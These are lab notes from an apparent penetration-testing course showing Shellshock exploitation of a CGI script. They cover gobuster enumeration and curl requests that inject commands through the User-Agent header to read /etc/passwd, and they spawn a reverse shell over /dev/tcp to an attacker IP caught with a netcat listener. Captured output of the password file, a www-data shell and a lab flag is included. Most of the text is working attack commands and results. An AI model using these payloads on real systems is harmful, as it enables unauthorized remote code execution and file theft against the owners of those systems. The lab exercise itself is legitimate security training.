# Attacking Common Gateway Interface (CGI) Applications - Shellshock

CGI scripts and programs are kept in the /CGI-bin directory on a web server and can be written in C, C++, Java, PERL, etc. 
CGI scripts run in the security context of the web server. 

--> No more utilized frequently

## CGI Attacks

https://nvd.nist.gov/vuln/detail/CVE-2014-6271

## Shellshock via CGI

env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"

If the system is not vulnerable, only "not vulnerable" will be printed.

### Enumeration - Gobuster

gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi

===============================================================
2023/03/23 09:26:04 Starting gobuster in directory enumeration mode
===============================================================
/access.cgi           (Status: 200) [Size: 0]
                                             
===============================================================
2023/03/23 09:26:29 Finished

curl -i http://10.129.204.231/cgi-bin/access.cgi

HTTP/1.1 200 OK
Date: Thu, 23 Mar 2023 13:28:55 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 0
Content-Type: text/html

### Confirming the Vulnerability

curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.204.231/cgi-bin/access.cgi

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync

### Exploitation to Reverse Shell Access

curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://10.129.204.231/cgi-bin/access.cgi

sudo nc -lvnp 7777

listening on [any] 7777 ...
connect to [10.10.14.38] from (UNKNOWN) [10.129.204.231] 52840
bash: cannot set terminal process group (938): Inappropriate ioctl for device
bash: no job control in this shell
www-data@htb:/usr/lib/cgi-bin$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@htb:/usr/lib/cgi-bin$

## LAB

gobuster dir -u http://10.129.205.27/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi

/access.cgi           (Status: 200) [Size: 0]

curl -i http://10.129.205.27/cgi-bin/access.cgi
HTTP/1.1 200 OK
Date: Fri, 12 Jan 2024 17:50:44 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 0
Content-Type: text/html

curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.205.27/cgi-bin/access.cgi

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync

curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.115/7777 0>&1' http://10.129.205.27/cgi-bin/access.cgi

sudo nc -lvnp 7777

www-data@htb:/usr/lib/cgi-bin$ cat flag.txt
cat flag.txt
Sh3ll_Sh0cK_123
